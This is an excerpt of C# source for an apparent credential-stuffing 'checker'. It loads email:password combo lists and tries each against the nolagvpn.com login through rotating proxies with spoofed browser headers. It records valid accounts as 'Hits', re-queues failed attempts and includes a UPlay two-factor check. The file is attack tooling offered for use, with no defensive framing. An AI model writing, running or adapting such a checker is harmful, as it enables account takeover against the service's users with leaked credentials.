...
namespace ZuttPal
{
	internal class nolag1kek
	{
		...
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!nolag1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (nolag1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								...
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = nolag1check.RandomProxies();
								...
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4495.0 Safari/537.36");
								httpRequest.AddHeader("Accept", "*/*");
								httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
								httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
								httpRequest.AddHeader("Content-Type", "application/json");
								httpRequest.AddHeader("X-Client-Version", "");
								httpRequest.AddHeader("Content-Length", "83");
								httpRequest.AddHeader("Origin", "https://nolagvpn.com");
								httpRequest.AddHeader("DNT", "1");
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Referer", "https://nolagvpn.com/");
								...
								if (login.Contains("EMAIL_NOT_FOUND") || login.Contains("INVALID_PASSWORD"))
								{
									...
									{
										Interlocked.Increment(ref nolag1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref nolag1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref nolag1check.Bad); Interlocked.Increment(ref stats.bad);
								...
								else if (login.Contains("idToken"))
								{
									Interlocked.Increment(ref nolag1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
									Interlocked.Increment(ref nolag1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
									Interlocked.Increment(ref nolag1check.Hits); Interlocked.Increment(ref stats.hits);
								...
								else
								{
									...
									Interlocked.Increment(ref nolag1check.retry);
									break;
								}
							}
							catch (Exception)
							{
								...
								string acc1 = email + ":" + password;
								nolag1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref nolag1check.retry);
								break;
							}
						}
			...
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						...
						if (httpRequest.Get(nolag1kek.SFACheckUri).ToString() == "[]")
							return true;
						break;
					}
				}
				...
				{
					Interlocked.Increment(ref nolag1check.Errors);
				}
			}
			return false;
		}
		...
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					...
					{
						req.Proxy = nolag1check.RandomProxies();
